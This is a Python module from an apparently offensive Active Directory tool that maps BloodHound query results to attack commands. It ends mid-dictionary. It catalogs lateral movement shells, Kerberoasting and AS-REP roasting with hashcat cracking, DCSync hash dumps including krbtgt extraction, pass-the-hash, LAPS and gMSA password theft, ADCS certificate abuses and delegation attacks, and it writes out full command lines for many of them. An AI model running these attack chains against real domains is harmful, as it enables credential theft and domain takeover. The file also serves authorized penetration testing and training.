"""
Blood-trail Query to Attack Command Mappings v2

DRY mapping system that:
- Maps bloodtrail query IDs to CRACK command database IDs
- Specifies which result fields contain arrays vs single values
- Defines access types for conditional command filtering
- Filters out invalid targets (groups misused as computers)
"""

from typing import Dict, List, Any, Optional


# =============================================================================
# QUERY MAPPINGS - DRY structure with array/field awareness
# =============================================================================

# Each mapping defines:
#   commands:      List of CRACK command IDs to suggest
#   access_type:   Edge type for conditional filtering (AdminTo, CanRDP, etc.)
#   array_field:   Result field containing array of targets (for expansion)
#   user_field:    Result field containing the user principal
#   target_field:  For single-target queries (user IS the target)
#   filter_groups: Skip group names that aren't valid computer targets
#   domain_level:  True for domain-wide commands (DCSync, etc.)

QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
    # ==================== LATERAL MOVEMENT (Array fields) ====================
    "lateral-adminto-nonpriv": {
        "commands": ["psexec-shell", "wmiexec-shell", "smbexec-shell"],
        "access_type": "AdminTo",
        "array_field": "AdminOnComputers",
        "user_field": "User",
        "permissions_required": "Local admin on target (AdminTo edge)",
    },
    "lateral-all-admins-per-computer": {
        "commands": ["psexec-shell"],
        "access_type": "AdminTo",
        "array_field": "LocalAdmins",  # Users who can admin
        "target_field": "Computer",     # Single computer per row
        "filter_groups": True,          # Filter out "DOMAIN ADMINS@..." etc.
        "permissions_required": "Local admin on target (AdminTo edge)",
    },
    "lateral-rdp-targets": {
        "commands": ["xfreerdp-connect"],
        "access_type": "CanRDP",
        "array_field": "RDPTargets",
        "user_field": "User",
        "permissions_required": "Remote Desktop Users or Administrators group",
    },
    "lateral-psremote-targets": {
        "commands": ["evil-winrm-shell"],
        "access_type": "CanPSRemote",
        "array_field": "PSRemoteTargets",
        "user_field": "User",
        "permissions_required": "Remote Management Users or Administrators group",
    },
    "lateral-dcom-targets": {
        "commands": ["wmiexec-shell"],
        "access_type": "ExecuteDCOM",
        "array_field": "DCOMTargets",
        "user_field": "User",
        "permissions_required": "DCOM execution rights on target",
    },
    "lateral-da-sessions-workstations": {
        "commands": ["psexec-shell"],
        "access_type": "HasSession",
        "target_field": "Workstation",
        "array_field": "PrivilegedSessions",  # Who's logged in
        "context": "Credential harvest - privileged session on target",
        "permissions_required": "Local admin on workstation to dump creds",
    },
    "lateral-sessions-on-computer": {
        "commands": ["psexec-shell"],
        "access_type": "HasSession",
        "target_field": "Computer",
        "user_field": "LoggedOnUser",
        "context": "Credential harvest opportunity",
        "permissions_required": "Local admin on target to dump creds",
    },
    "lateral-user-access-all": {
        "commands": ["psexec-shell", "evil-winrm-shell", "xfreerdp-connect"],
        "target_field": "Target",
        "access_type_field": "AccessType",  # Dynamic: AdminTo|CanRDP|CanPSRemote
        "permissions_required": "Varies by access type (AdminTo/CanRDP/CanPSRemote)",
    },
    "lateral-domain-users-admin": {
        "commands": ["psexec-shell"],
        "access_type": "AdminTo",
        "target_field": "Computer",
        "context": "Domain Users = local admin (any user can compromise)",
        "permissions_required": "Any domain user (misconfigured local admin)",
    },
    "lateral-da-sessions": {
        "commands": ["psexec-shell"],
        "access_type": "HasSession",
        "target_field": "Computer",
        "context": "DA session - prime mimikatz target",
        "permissions_required": "Local admin on target to dump creds",
    },

    # ==================== QUICK WINS (Single value targets) ====================
    "quick-asrep-roastable": {
        "commands": ["impacket-getnpusers-asreproast"],
        "access_type": None,  # No lateral access check
        "discovery_command": True,  # Enumerates targets, uses attacker creds
        "target_field": "User",  # What we discovered
        "context": "AS-REP roast - no auth required",
        "permissions_required": "None (pre-auth disabled on target)",
        "post_success": [
            {"description": "Crack the hash", "command": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"},
            {"description": "Validate credentials", "command": "crackmapexec smb <DC_IP> -u '<CRACKED_USER>' -p '<PASSWORD>'"},
            {"description": "Check user access", "command": "bloodtrail --run-query owned-what-can-access --var USER=<CRACKED_USER>@<DOMAIN>"},
            {"description": "Mark as owned in BloodHound", "command": None},
        ],
    },
    "quick-kerberoastable": {
        "commands": ["impacket-getuserspns-kerberoast"],
        "access_type": None,
        "discovery_command": True,  # Enumerates all SPNs, uses attacker creds
        "target_field": "ServiceAccount",  # What we discovered
        "context": "Kerberoast - request TGS for offline cracking",
        "permissions_required": "Any authenticated domain user",
        "post_success": [
            {"description": "Crack the hash", "command": "hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt"},
            {"description": "Validate credentials", "command": "crackmapexec smb <DC_IP> -u '<CRACKED_USER>' -p '<PASSWORD>'"},
            {"description": "Check user access", "command": "bloodtrail --run-query owned-what-can-access --var USER=<CRACKED_USER>@<DOMAIN>"},
            {"description": "Mark as owned in BloodHound", "command": None},
        ],
    },
    "quick-kerberoastable-privileged": {
        # No commands - this is a PRIORITIZATION query, not a separate attack
        # Kerberoasting gets ALL SPNs in one request; this query just highlights
        # which results to crack first. Command shown in quick-kerberoastable.
        "commands": [],
        "access_type": None,
        "discovery_command": True,
        "target_field": "HighValueTarget",
        "context": "Priority target - crack this hash first",
        "permissions_required": "Any authenticated domain user",
    },
    "quick-unconstrained-delegation": {
        "commands": ["rubeus-monitor"],
        "access_type": None,
        "target_field": "Computer",
        "context": "Unconstrained delegation - monitor for TGT capture",
        "permissions_required": "Local admin on unconstrained delegation host",
    },
    "quick-constrained-delegation": {
        "commands": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
        "access_type": None,
        "target_field": "Principal",
        "context": "Constrained delegation - S4U2Self/S4U2Proxy",
        "permissions_required": "Control of delegating principal (password/hash/TGT)",
    },
    "quick-password-in-description": {
        "commands": ["crackmapexec-smb-spray", "evil-winrm-shell"],
        "access_type": None,
        "user_field": "User",
        "context": "Password in description - validate and use",
        "permissions_required": "LDAP read access (any domain user)",
        "post_success": [
            {"description": "Validate the password from description", "command": "crackmapexec smb <DC_IP> -u '<USER>' -p '<PASSWORD_FROM_DESC>'"},
            {"description": "Check user access", "command": "bloodtrail --run-query owned-what-can-access --var USER=<USER>@<DOMAIN>"},
            {"description": "Mark as owned in BloodHound", "command": None},
        ],
    },

    # ==================== PRIVILEGE ESCALATION ====================
    "privesc-dcsync-rights": {
        "commands": ["ad-dcsync-impacket-secretsdump-user"],
        "access_type": "DCSync",
        "principal_field": "Principal",
        "filter_groups": True,  # Filter "DOMAIN CONTROLLERS@..." etc.
        "domain_level": True,
        "context": "DCSync - dump domain hashes",
        "permissions_required": "GetChanges + GetChangesAll on domain object",
        "post_success": [
            {"description": "Dump all hashes", "command": "impacket-secretsdump -just-dc <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>"},
            {"description": "Extract krbtgt hash for Golden Ticket", "command": "impacket-secretsdump -just-dc-user krbtgt <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>"},
            {"description": "Pass-the-Hash as Administrator", "command": "impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<TARGET>"},
        ],
    },
    "privesc-genericall-highvalue": {
        "commands": ["crackmapexec-smb-spray"],  # Reset password then spray
        "access_type": "GenericAll",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "GenericAll - reset password or add to group",
        "permissions_required": "GenericAll ACL on target object",
    },
    "privesc-shadow-admins": {
        "commands": ["ad-dcsync-impacket-secretsdump-user"],
        "access_type": "GenericAll",
        "user_field": "Attacker",
        "target_field": "Victim",
        "context": "Shadow admin - control over DA",
        "permissions_required": "GenericAll over privileged user/group",
    },
    "privesc-force-change-password": {
        "commands": ["crackmapexec-smb-spray"],  # Reset password then spray
        "access_type": "ForceChangePassword",
        "user_field": "Attacker",
        "target_field": "Victim",
        "context": "ForceChangePassword - reset and use",
        "permissions_required": "User-Force-Change-Password extended right",
    },
    "privesc-genericwrite": {
        "commands": ["impacket-getuserspns-kerberoast"],
        "access_type": "GenericWrite",
        "user_field": "Attacker",
        "target_field": "Victim",
        "context": "GenericWrite - add SPN then Kerberoast",
        "permissions_required": "GenericWrite on target user",
    },
    "privesc-add-member": {
        "commands": ["psexec-shell"],
        "access_type": "AddMember",
        "user_field": "Attacker",
        "target_field": "Group",
        "context": "AddMember - add self to admin group",
        "permissions_required": "AddMember/WriteProperty on group",
    },
    "privesc-readgmsapassword": {
        "commands": ["gmsadumper", "evil-winrm-shell"],
        "access_type": "ReadGMSAPassword",
        "user_field": "Reader",
        "target_field": "GMSA",
        "context": "Read GMSA password - use for access",
        "permissions_required": "In PrincipalsAllowedToRetrieveManagedPassword",
    },

    # ==================== ATTACK CHAINS ====================
    "chain-shortest-to-da": "BUILD_SEQUENCE",
    "chain-all-paths-to-da": "BUILD_SEQUENCE",
    "chain-owned-to-pivot-to-da": "BUILD_SEQUENCE",
    "chain-credential-harvest": "BUILD_SEQUENCE",
    "chain-complete-compromise": "BUILD_SEQUENCE",
    "chain-lateral-to-privilege": "BUILD_SEQUENCE",

    # ==================== OWNED PRINCIPAL ====================
    "owned-what-can-access": {
        "commands": ["psexec-shell", "evil-winrm-shell", "xfreerdp-connect"],
        "target_field": "Target",
        "access_type_field": "AccessType",  # Dynamic from query result
        "permissions_required": "Owned user credentials + their access rights",
    },
    "owned-path-to-da": "BUILD_SEQUENCE",
    "owned-first-hop": {
        "commands": ["psexec-shell", "evil-winrm-shell"],
        "target_field": "Target",
        "access_type_field": "AccessType",
        "permissions_required": "Owned user credentials + their access rights",
    },
    "owned-admin-on": {
        "commands": ["psexec-shell", "wmiexec-shell"],
        "access_type": "AdminTo",
        "target_field": "Target",
        "permissions_required": "Owned user with AdminTo on target",
    },
    "owned-cred-harvest-targets": {
        "commands": ["psexec-shell"],
        "access_type": "HasSession",
        "target_field": "Computer",
        "context": "Credential harvest from DA session",
        "permissions_required": "Local admin on target to dump creds",
    },

    # ==================== DELEGATION QUERIES ====================
    "delegation-rbcd-targets": {
        "commands": ["rbcd-getST", "rubeus-s4u-impersonate"],
        "access_type": "AllowedToAct",
        "target_field": "RBCDTarget",
        "array_field": "AllowedPrincipals",
        "context": "RBCD - impersonate users to target",
        "permissions_required": "Control of principal in msDS-AllowedToActOnBehalfOfOtherIdentity",
    },
    "delegation-rbcd-writers": {
        "commands": ["rbcd-set-msds", "bloodyad-rbcd"],
        "access_type": "WriteAccountRestrictions",
        "user_field": "Attacker",
        "target_field": "TargetComputer",
        "context": "Can configure RBCD on target computer",
        "permissions_required": "WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity",
    },
    "delegation-constrained-abuse": {
        "commands": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
        "access_type": "AllowedToDelegate",
        "user_field": "DelegatingPrincipal",
        "array_field": "DelegationTargets",
        "context": "Constrained delegation - S4U2Self/S4U2Proxy",
        "permissions_required": "Control of delegating principal (password/hash/TGT)",
    },
    "delegation-constrained-to-dc": {
        "commands": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
        "access_type": "AllowedToDelegate",
        "user_field": "DelegatingPrincipal",
        "target_field": "DomainController",
        "context": "Constrained delegation to DC - high value",
        "permissions_required": "Control of delegating principal (password/hash/TGT)",
    },
    "delegation-unconstrained": {
        "commands": ["rubeus-monitor", "rubeus-tgtdeleg"],
        "access_type": None,
        "target_field": "Computer",
        "context": "Unconstrained delegation - TGT capture target",
        "permissions_required": "Local admin on unconstrained delegation host",
    },
    "delegation-unconstrained-nondc": {
        "commands": ["rubeus-monitor", "petitpotam-coerce", "coercer-coerce"],
        "access_type": None,
        "target_field": "Computer",
        "context": "Non-DC unconstrained - coerce + capture TGT",
        "permissions_required": "Local admin on unconstrained host + coercion capability",
    },
    "delegation-user-unconstrained": {
        "commands": ["rubeus-monitor"],
        "access_type": None,
        "user_field": "User",
        "context": "User with unconstrained delegation",
        "permissions_required": "Control of user with unconstrained delegation",
    },
    "delegation-rbcd-chain": {
        "commands": ["rbcd-set-msds", "rbcd-getST"],
        "access_type": "WriteAccountRestrictions",
        "user_field": "Attacker",
        "target_field": "TargetComputer",
        "array_field": "PrivilegedSessions",
        "context": "Full RBCD chain - write + impersonate to cred harvest",
        "permissions_required": "WriteProperty on target + control of computer account",
    },
    "delegation-add-allowed-to-act": {
        "commands": ["rbcd-set-msds"],
        "access_type": "AddAllowedToAct",
        "user_field": "Attacker",
        "target_field": "TargetComputer",
        "context": "AddAllowedToAct - configure RBCD directly",
        "permissions_required": "AddAllowedToAct permission on target computer",
    },
    "delegation-protocol-transition": {
        "commands": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
        "access_type": "AllowedToDelegate",
        "user_field": "Principal",
        "context": "Protocol transition - S4U2Self without user auth",
        "permissions_required": "Control of principal with TRUSTED_TO_AUTH_FOR_DELEGATION",
    },

    # ==================== ADCS QUERIES ====================
    "adcs-esc1-vulnerable": {
        "commands": ["certipy-req-esc1"],
        "access_type": "ADCSESC1",
        "user_field": "Attacker",
        "target_field": "VulnerableTemplate",
        "context": "ESC1 - Request certificate as any user",
        "permissions_required": "Enroll rights on vulnerable template",
    },
    "adcs-esc3-enrollment-agents": {
        "commands": ["certipy-req-esc1"],  # After getting agent cert
        "access_type": "ADCSESC3",
        "user_field": "Attacker",
        "target_field": "AgentTemplate",
        "context": "ESC3 - Enrollment agent abuse",
        "permissions_required": "Enrollment agent certificate",
    },
    "adcs-esc4-template-write": {
        "commands": ["certipy-req-esc4"],
        "access_type": "ADCSESC4",
        "user_field": "Attacker",
        "target_field": "ModifiableTemplate",
        "context": "ESC4 - Modify template for ESC1",
        "permissions_required": "WriteProperty/WriteDacl on certificate template",
    },
    "adcs-esc5-pki-object-acls": {
        "commands": ["certipy-find"],
        "access_type": "ADCSESC5",
        "user_field": "Attacker",
        "target_field": "PKIObject",
        "context": "ESC5 - PKI object ACL abuse",
        "permissions_required": "WriteProperty/WriteDacl on PKI objects",
    },
    "adcs-esc6a-editf-flag": {
        "commands": ["certipy-req-esc1"],  # SAN enabled by flag
        "access_type": "ADCSESC6a",
        "user_field": "Attacker",
        "target_field": "VulnerableCA",
        "context": "ESC6a - EDITF_ATTRIBUTESUBJECTALTNAME2 enabled",
        "permissions_required": "Enroll rights on any template (CA misconfigured)",
    },
    "adcs-esc6b-issuance-requirements": {
        "commands": ["certipy-req-esc1"],
        "access_type": "ADCSESC6b",
        "user_field": "Attacker",
        "target_field": "VulnerableCA",
        "context": "ESC6b - Weak issuance requirements",
        "permissions_required": "Enroll rights (weak manager approval)",
    },
    "adcs-esc7-ca-acls": {
        "commands": ["certipy-req-esc7"],
        "access_type": "ADCSESC7",
        "user_field": "Attacker",
        "target_field": "TargetCA",
        "context": "ESC7 - ManageCA rights abuse",
        "permissions_required": "ManageCA or ManageCertificates on CA",
    },
    "adcs-esc9a-no-security-extension": {
        "commands": ["certipy-req-esc1", "certipy-auth"],
        "access_type": "ADCSESC9a",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC9a - No security extension bypass",
        "permissions_required": "GenericWrite on target + enroll rights",
    },
    "adcs-esc9b-weak-mapping": {
        "commands": ["certipy-req-esc1", "certipy-auth"],
        "access_type": "ADCSESC9b",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC9b - Weak certificate mapping",
        "permissions_required": "GenericWrite on target + enroll rights",
    },
    "adcs-esc10a-weak-cert-binding": {
        "commands": ["certipy-req-esc1", "certipy-auth"],
        "access_type": "ADCSESC10a",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC10a - Weak certificate binding",
        "permissions_required": "Enroll rights (StrongCertificateBindingEnforcement=0)",
    },
    "adcs-esc10b-shadow-credentials": {
        "commands": ["certipy-shadow"],
        "access_type": "ADCSESC10b",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC10b - Shadow credentials via ADCS",
        "permissions_required": "GenericWrite on target for msDS-KeyCredentialLink",
    },
    "adcs-esc13-oid-group": {
        "commands": ["certipy-req-esc1"],
        "access_type": "ADCSESC13",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC13 - OID group link privilege escalation",
        "permissions_required": "Enroll on template with issuance policy linked to group",
    },
    "adcs-golden-cert": {
        "commands": ["certipy-forge"],
        "access_type": "GoldenCert",
        "user_field": "Attacker",
        "target_field": "CompromisedCA",
        "domain_level": True,
        "context": "Golden Certificate - CA key compromise",
        "permissions_required": "CA private key (backup/DVCD/local admin on CA)",
    },
    "adcs-enroll-on-behalf": {
        "commands": ["certipy-req-esc1"],
        "access_type": "EnrollOnBehalfOf",
        "user_field": "EnrollmentAgent",
        "target_field": "Victim",
        "context": "Enrollment agent impersonation",
        "permissions_required": "Valid enrollment agent certificate",
    },
    "adcs-enrollment-targets": {
        "commands": ["certipy-req-esc1", "certify-request"],
        "access_type": "Enroll",
        "user_field": "Principal",
        "target_field": "Template",
        "context": "Certificate enrollment rights",
        "permissions_required": "Enroll permission on template",
    },
    "adcs-manage-ca": {
        "commands": ["certipy-req-esc7"],
        "access_type": "ManageCA",
        "user_field": "Attacker",
        "target_field": "TargetCA",
        "context": "CA management rights",
        "permissions_required": "ManageCA right on Certificate Authority",
    },
    "adcs-ca-servers": {
        "commands": ["certipy-find", "certify-find"],
        "access_type": None,
        "target_field": "CAServer",
        "context": "Certificate Authority enumeration",
        "discovery_command": True,
        "permissions_required": "Any authenticated domain user",
    },
    "adcs-certificate-templates": {
        "commands": ["certipy-find", "certify-find"],
        "access_type": None,
        "target_field": "Template",
        "context": "Certificate template enumeration",
        "discovery_command": True,
        "permissions_required": "Any authenticated domain user",
    },
    "adcs-all-esc-paths": {
        "commands": ["certipy-find"],
        "access_type": None,
        "context": "All ESC attack paths summary",
        "discovery_command": True,
        "permissions_required": "Any authenticated domain user",
    },
    "adcs-ntauth-store": {
        "commands": ["certipy-find"],
        "access_type": "GenericAll",
        "user_field": "Attacker",
        "target_field": "NTAuthStore",
        "context": "NTAuthCertificates modification rights",
        "permissions_required": "GenericAll on NTAuthCertificates container",
    },

    # ==================== COERCION / LATERAL (NEW) ====================
    "lateral-coerce-to-tgt": {
        "commands": ["petitpotam-coerce", "coercer-coerce", "printerbug-trigger", "dfscoerce-trigger"],
        "access_type": "CoerceToTGT",
        "user_field": "CoercionHost",
        "target_field": "CanCaptureTGTFrom",
        "context": "Coerce authentication to capture TGT",
        "permissions_required": "Network access to target + listener on unconstrained host",
    },
    "lateral-sid-history": {
        "commands": ["psexec-shell", "wmiexec-shell"],
        "access_type": "HasSIDHistory",
        "user_field": "Principal",
        "target_field": "HasSIDOf",
        "context": "SID History grants inherited permissions",
        "permissions_required": "Control of principal with SID history",
    },
    "lateral-trust-abuse": {
        "commands": ["psexec-shell"],
        "access_type": "TrustedBy",
        "user_field": "TrustingDomain",
        "target_field": "TrustedDomain",
        "context": "Cross-domain trust relationship",
        "permissions_required": "Domain admin in trusting domain (for golden ticket)",
    },

    # ==================== PRIVILEGE ESCALATION (NEW) ====================
    "privesc-write-spn": {
        "commands": ["impacket-getuserspns-kerberoast"],
        "access_type": "WriteSPN",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "Add SPN for targeted Kerberoasting",
        "permissions_required": "WriteProperty on servicePrincipalName",
    },
    "privesc-write-account-restrictions": {
        "commands": ["rbcd-set-msds", "bloodyad-rbcd"],
        "access_type": "WriteAccountRestrictions",
        "user_field": "Attacker",
        "target_field": "RBCDTarget",
        "context": "Configure RBCD on computer",
        "permissions_required": "WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity",
    },
    "privesc-sync-laps": {
        "commands": ["laps-password-cme", "laps-password-ldapsearch"],
        "access_type": "SyncLAPSPassword",
        "user_field": "Principal",
        "array_field": "Computers",
        "domain_level": True,
        "context": "Domain-wide LAPS sync rights",
        "permissions_required": "SyncLAPSPassword extended right (domain-wide)",
    },
    "privesc-add-allowed-to-act": {
        "commands": ["rbcd-set-msds"],
        "access_type": "AddAllowedToAct",
        "user_field": "Attacker",
        "target_field": "RBCDTarget",
        "context": "AddAllowedToAct - configure RBCD",
        "permissions_required": "AddAllowedToAct extended right on target",
    },
    "privesc-dcsync-composite": {
        "commands": ["ad-dcsync-impacket-secretsdump-user"],
        "access_type": "DCSync",
        "user_field": "DCSync_Principal",
        "target_field": "Domain",
        "domain_level": True,
        "context": "Full DCSync rights (GetChanges+GetChangesAll)",
        "permissions_required": "GetChanges + GetChangesAll on domain object",
    },

    # ==================== QUICK WINS (NEW) ====================
    "quick-gmsa-password": {
        "commands": ["gmsadumper", "bloodyad-gmsa"],
        "access_type": "ReadGMSAPassword",
        "user_field": "Attacker",
        "target_field": "GMSAAccount",
        "context": "Read gMSA password - cleartext credential",
        "permissions_required": "In PrincipalsAllowedToRetrieveManagedPassword",
        "post_success": [
            {"description": "Use gMSA credentials", "command": "crackmapexec smb <TARGET> -u '<GMSA_NAME>$' -p '<GMSA_PASSWORD>'"},
            {"description": "Check gMSA access", "command": "bloodtrail --run-query owned-what-can-access --var USER=<GMSA_NAME>$@<DOMAIN>"},
            {"description": "gMSA often has elevated privileges", "command": None},
        ],
    },
    "quick-laps-readers": {
        "commands": ["laps-password-cme", "laps-password-ldapsearch"],
        "access_type": "ReadLAPSPassword",
        "user_field": "Attacker",
        "array_field": "Computers",
        "context": "Read LAPS password - local admin creds",
        "permissions_required": "Read access to ms-mcs-AdmPwd attribute",
        "post_success": [
            {"description": "Read LAPS password", "command": "crackmapexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -M laps"},
            {"description": "Use local admin creds", "command": "crackmapexec smb <TARGET> -u 'Administrator' -p '<LAPS_PASSWORD>' --local-auth"},
            {"description": "Dump creds from target", "command": "crackmapexec smb <TARGET> -u 'Administrator' -p '<LAPS_PASSWORD>' --local-auth --sam"},
        ],
    },
    "quick-gmsa-all": {
        "commands": ["gmsadumper"],
        "access_type": None,
        "target_field": "GMSAAccount",
        "context": "gMSA enumeration",
        "discovery_command": True,
        "permissions_required": "Any authenticated domain user (enumeration only)",
    },
}


# =============================================================================
# EDGE TYPE -> COMMAND MAPPINGS (for attack sequence building)
# =============================================================================

EDGE_COMMAND_MAPPINGS: Dict[str, List[str]] = {
    # Access Edges
    "AdminTo": ["psexec-shell", "wmiexec-shell", "smbexec-shell"],
    "CanRDP": ["xfreerdp-connect"],
    "CanPSRemote": ["evil-winrm-shell"],
    "ExecuteDCOM": ["wmiexec-shell"],
    "HasSession": ["psexec-shell"],  # Get shell to harvest creds

    # Permission Edges (ACL abuse)
    # Note: bloodyad-genericall, dacledit, owneredit, net-group-add not yet in DB
    # Using available alternatives until dedicated ACL commands are added
    "GenericAll": ["crackmapexec-smb-spray"],  # Reset password then spray
    "GenericWrite": ["impacket-getuserspns-kerberoast"],  # Add SPN then kerberoast
    "WriteDacl": [],  # TODO: add dacledit command
    "WriteOwner": [],  # TODO: add owneredit command
    "ForceChangePassword": ["crackmapexec-smb-spray"],  # Spray with new password
    "AddMember": [],  # TODO: add net-group-add command
    "Owns": ["crackmapexec-smb-spray"],  # Full control - reset password

    # Privilege Edges
    "GetChanges": ["ad-dcsync-impacket-secretsdump-user"],
    "GetChangesAll": ["ad-dcsync-impacket-secretsdump-user"],
    "AllExtendedRights": ["ad-dcsync-impacket-secretsdump-user"],

    # Credential Edges
    "ReadGMSAPassword": ["gmsadumper", "bloodyad-gmsa"],
    "ReadLAPSPassword": ["laps-password-cme", "laps-password-ldapsearch"],
    "AddKeyCredentialLink": ["certipy-shadow"],  # TODO: add pywhisker command
    "SyncLAPSPassword": ["laps-password-cme", "laps-password-ldapsearch"],

    # Delegation Edges
    "AllowedToDelegate": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
    "AllowedToAct": ["rbcd-getST", "rubeus-s4u-impersonate"],
    "AddAllowedToAct": ["rbcd-set-msds"],
    "WriteAccountRestrictions": ["rbcd-set-msds", "bloodyad-rbcd"],

    # ADCS Edges (Certificate Services)
    "ADCSESC1": ["certipy-req-esc1"],
    "ADCSESC3": ["certipy-req-esc1"],
    "ADCSESC4": ["certipy-req-esc4"],
    "ADCSESC5": ["certipy-find"],
    "ADCSESC6a": ["certipy-req-esc1"],
    "ADCSESC6b": ["certipy-req-esc1"],
    "ADCSESC7": ["certipy-req-esc7"],
    "ADCSESC9a": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC9b": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC10a": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC10b": ["certipy-shadow"],
    "ADCSESC13": ["certipy-req-esc1"],
    "GoldenCert": ["certipy-forge"],
    "Enroll": ["certipy-req-esc1", "certify-request"],
    "EnrollOnBehalfOf": ["certipy-req-esc1"],
    "ManageCA": ["certipy-req-esc7"],
    "ManageCertificates": ["certipy-req-esc7"],

    # Coercion Edges
    "CoerceToTGT": ["petitpotam-coerce", "coercer-coerce", "printerbug-trigger", "dfscoerce-trigger"],

    # SID/Trust Edges
    "HasSIDHistory": ["psexec-shell", "wmiexec-shell"],
    "TrustedBy": ["psexec-shell"],

    # Other PrivEsc Edges
    "WriteSPN": ["impacket-getuserspns-kerberoast"],

    # Membership (informational)
    "MemberOf": [],
}


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def extract_domain(upn: str) -> str:
    """Extract domain from UPN format. MIKE@CORP.COM -> CORP.COM"""
    if "@" in upn:
        return upn.split("@")[1]
    return ""


def extract_username(upn: str) -> str:
    """Extract username from UPN format. MIKE@CORP.COM -> MIKE"""
    if "@" in upn:
        return upn.split("@")[0]
    return upn


def infer_dc_hostname(domain: str) -> str:
    """
    Infer DC hostname from domain name.
    CORP.COM -> DC01.CORP.COM (common pattern)

    Note: This is best-effort. User may need to adjust for non-standard DC names.
    """
    if not domain:
        return "<DC_IP>"
    # Try common DC naming patterns
    return f"DC01.{domain}"


# =============================================================================
# GROUP NAME DETECTION (for filtering invalid targets)
# =============================================================================

# Common AD group patterns that should NOT be used as computer targets
GROUP_NAME_PATTERNS = [
    "DOMAIN CONTROLLERS",
    "DOMAIN ADMINS",
    "ENTERPRISE ADMINS",
    "ADMINISTRATORS",
    "SCHEMA ADMINS",
    "DNSADMINS",
    "CLONEABLE DOMAIN CONTROLLERS",
    "ENTERPRISE READ-ONLY DOMAIN CONTROLLERS",
    "PROTECTED USERS",
    "KEY ADMINS",
    "ENTERPRISE KEY ADMINS",
    "CERT PUBLISHERS",
    "RAS AND IAS SERVERS",
    "ALLOWED RODC PASSWORD REPLICATION GROUP",
    "DENIED RODC PASSWORD REPLICATION GROUP",
    "READ-ONLY DOMAIN CONTROLLERS",
    "GROUP POLICY CREATOR OWNERS",
    "DOMAIN COMPUTERS",
    "DOMAIN GUESTS",
    "DOMAIN USERS",
    "ACCOUNT OPERATORS",
    "SERVER OPERATORS",
    "PRINT OPERATORS",
    "BACKUP OPERATORS",
    "REPLICATOR",
]


def is_group_name(name: str) -> bool:
    """
    Detect if a name is a group (not a valid computer target).

    Groups like "DOMAIN CONTROLLERS@CORP.COM" should not be used
    as <TARGET> in attack commands.
    """
    if not name:
        return False
    upper = name.upper()
    # Check against known patterns
    for pattern in GROUP_NAME_PATTERNS:
        if pattern in upper:
            return True
    return False


# =============================================================================
# SENSITIVE PLACEHOLDERS (never auto-fill)
# =============================================================================

SENSITIVE_PLACEHOLDERS = {
    "<PASSWORD>",
    "<HASH>",
    "<NTLM_HASH>",
    "<LM_HASH>",
    "<TICKET>",
    "<PRIVATE_KEY>",
    "<TARGET_USER>",  # User to DCSync - needs manual selection
}


# =============================================================================
# ACCESS TYPE -> REWARDS MAPPING (practical value of exploiting this access)
# =============================================================================

ACCESS_TYPE_REWARDS: Dict[Optional[str], str] = {
    # Lateral Movement rewards
    "AdminTo": "SYSTEM shell for credential dumping, persistence, and pivoting",
    "CanRDP": "Interactive desktop access for GUI tools and credential theft",
    "CanPSRemote": "PowerShell remoting for stealthy command execution",
    "ExecuteDCOM": "Remote code execution via DCOM for lateral movement",
    "HasSession": "Harvest cached credentials from logged-in privileged user",
    "CoerceToTGT": "Capture TGT for pass-the-ticket attacks",
    "HasSIDHistory": "Inherited permissions from historical SID membership",
    "TrustedBy": "Cross-domain access via trust relationship",

    # Delegation rewards
    "AllowedToDelegate": "Impersonate any user to target service via S4U",
    "AllowedToAct": "Impersonate users via RBCD for privileged access",
    "AddAllowedToAct": "Configure RBCD to enable user impersonation",
    "WriteAccountRestrictions": "Modify RBCD settings for delegation abuse",

    # Privilege Escalation rewards
    "DCSync": "Dump all domain password hashes including krbtgt",
    "GenericAll": "Full control - reset passwords, modify group membership",
    "GenericWrite": "Add SPN for Kerberoasting or modify attributes",
    "WriteDacl": "Grant yourself additional permissions on object",
    "WriteOwner": "Take ownership then modify DACL for full control",
    "ForceChangePassword": "Reset user password without knowing current",
    "AddMember": "Add yourself to privileged groups",
    "ReadGMSAPassword": "Retrieve cleartext gMSA password for authentication",
    "ReadLAPSPassword": "Retrieve local admin password from LAPS",
    "SyncLAPSPassword": "Domain-wide LAPS password retrieval",
    "AddKeyCredentialLink": "Add shadow credentials for certificate-based auth",
    "WriteSPN": "Add SPN for targeted Kerberoasting attack",
    "Owns": "Full object control - reset password or modify permissions",

    # ADCS rewards
    "ADCSESC1": "Request certificate as any user for domain admin access",
    "ADCSESC3": "Enrollment agent abuse for user impersonation",
    "ADCSESC4": "Modify template to enable ESC1 vulnerability",
    "ADCSESC5": "PKI object modification for certificate abuse",
    "ADCSESC6a": "Request cert with arbitrary SAN for impersonation",
    "ADCSESC6b": "Bypass issuance requirements for unauthorized certs",
    "ADCSESC7": "Approve pending certificate requests as CA manager",
    "ADCSESC9a": "Bypass security extension for certificate abuse",
    "ADCSESC9b": "Exploit weak certificate mapping for impersonation",
    "ADCSESC10a": "Exploit weak cert binding for authentication",
    "ADCSESC10b": "Shadow credentials via ADCS for persistent access",
    "ADCSESC13": "OID group link for privilege escalation",
    "GoldenCert": "Forge any certificate with compromised CA key",
    "Enroll": "Request certificates for authentication",
